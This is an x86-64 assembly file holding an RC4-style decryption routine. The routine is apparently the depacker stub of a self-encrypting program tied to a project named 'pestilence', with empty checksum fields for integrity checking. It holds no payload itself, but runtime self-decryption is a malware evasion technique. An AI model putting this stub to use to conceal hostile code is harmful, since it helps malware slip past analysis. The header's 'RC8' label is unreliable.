;; For more details about this algorithm: it's an RC8 algorithme with a base key of 256 bytes
%define DEPACKER_S
%include "pestilence.lst"

section .text
	global _decrypt
	global _end_decrypt
	global _checksum
	global _text_section_vaddr
	global _total_size_to_checksum

_decrypt: ; ((void*)key rdi, (void*)zone rsi, (int)zone_size rdx, void* new_zone r10)
; allocate necessary stack memory
    push rbp
    mov rbp, rsp
	push r10
	push rdi
	push rsi
	push rdx
    sub rsp, 0x490 ;0x12c
    xor rcx, rcx

_init_table:
; while (rcx < 256) {
;   (int*)rsp[rcx] = rcx;
;   rcx++;
;}
    cmp rcx, 0x100
    jge _init_sorting
    xor r10, r10
    mov r10, 4
    xor rax, rax
    mov rax, rcx
    mul r10
    mov DWORD [rsp + rax], ecx
    inc rcx
    jmp _init_table

_init_sorting:
    xor rcx, rcx
    mov r10, QWORD [rsp + 1040]
    xor QWORD [rsp + 1040], r10

_sorting:
; while (rcx < 256)
    cmp rcx, 0x100
    jge _init_decrypt_loop
; we take our index. we work with integers, that take 4 bytes so:
; we multiply our index by our integer size to take our offset in table
    xor r12, r12
    mov r12, 4
    xor rax, rax
    mov rax, rcx
    mul r12

; j += tab[i]
    xor r10, r10
    mov r10d, DWORD [rsp + rax]
    add QWORD [rsp + 1040], r10

; j += key[i]
    xor r11, r11
    mov r11, QWORD [rsp + 0x4a0]
    xor r10, r10
    mov r10b, BYTE [r11 + rcx]
    add QWORD [rsp + 1040], r10

; j = j % 256 is equal j = j & 255
    and QWORD [rsp + 1040], 255

; swap tab[i] with tab[j]
    lea rdi, [rel rsp + rax]
    xor r10, r10
    mov r10b, BYTE [rsp + 1040]
    xor rax, rax
    xor r12, r12
    mov r12, 4
    mov rax, r10
    mul r12
    lea rsi, [rel rsp + rax]

_swap:
    xor r10, r10
    xor r11, r11
    mov r10d, DWORD [rdi]
    mov r11d, DWORD [rsi]
    add DWORD [rdi], r11d
    mov r10d, DWORD [rdi]
    sub r10, r11
    mov DWORD [rsi], r10d
    mov r11d, DWORD [rsi]
    sub DWORD [rdi], r11d
    inc rcx
    jmp _sorting

_init_decrypt_loop:
	xor r10, r10
	mov r10, QWORD [rsp + 1040]
	xor QWORD [rsp + 1040], r10
	xor r10, r10
	mov r10, QWORD [rsp + 1048]
	xor QWORD [rsp + 1048], r10
	xor rcx, rcx

_decrypt_loop:
    xor r10, r10
    mov r10, QWORD [rsp + 0x490]
	cmp rcx, r10
	jge _end_decrypt
	add QWORD [rsp + 1040], 1
	and QWORD [rsp + 1040], 255
	xor r10, r10
	mov r10, QWORD [rsp + 1040]
    xor r12, r12
    xor rax, rax
    mov r12, 4
    mov rax, r10
    mul r12
	lea rdi, [rel rsp + rax]
	xor r10, r10
	mov r10d, DWORD [rdi]
	add QWORD [rsp + 1048], r10
	and QWORD [rsp + 1048], 255
	xor r10, r10
	mov r10, QWORD [rsp + 1048]
    xor r12, r12
    xor rax, rax
    mov r12, 4
    mov rax, r10
    mul r12
	lea rsi, [rel rsp + rax]

_swap2:
    xor r10, r10
    xor r11, r11
    mov r10d, DWORD [rdi]
    mov r11d, DWORD [rsi]
    add DWORD [rdi], r11d
    mov r10d, DWORD [rdi]
    sub r10, r11
    mov DWORD [rsi], r10d
    mov r11d, DWORD [rsi]
    sub DWORD [rdi], r11d

_continue:
    xor r10, r10
	mov r10, QWORD [rsp + 1048]
	xor QWORD [rsp + 1048], r10
	xor r10, r10
	mov r10d, DWORD [rdi]
	xor r11, r11
	mov r11d, DWORD [rsi]
	add QWORD [rsp + 1048], r10
	add QWORD [rsp + 1048], r11
	and QWORD [rsp + 1048], 255
	xor r11, r11
	mov r11, QWORD [rsp + 1048]
    xor r12, r12
    xor rax, rax
    mov r12, 4
    mov rax, r11
    mul r12
	xor r10, r10
	mov r10d, DWORD [rsp + rax]
    xor r11, r11
    mov r11, QWORD [rsp + 0x498]
	mov rdi, QWORD [rsp + 0x4a8]
	xor rsi, rsi
	mov sil, BYTE [r11 + rcx]
	mov BYTE [rdi + rcx], sil
	xor BYTE [rdi + rcx], r10b
	inc rcx
	jmp _decrypt_loop

_end_decrypt:
	leave
	ret

_text_section_vaddr:
	dq 0x0000000000000000

_total_size_to_checksum:
	dd 0x00000000

_checksum:
	dd 0x00000000

%undef DEPACKER_S
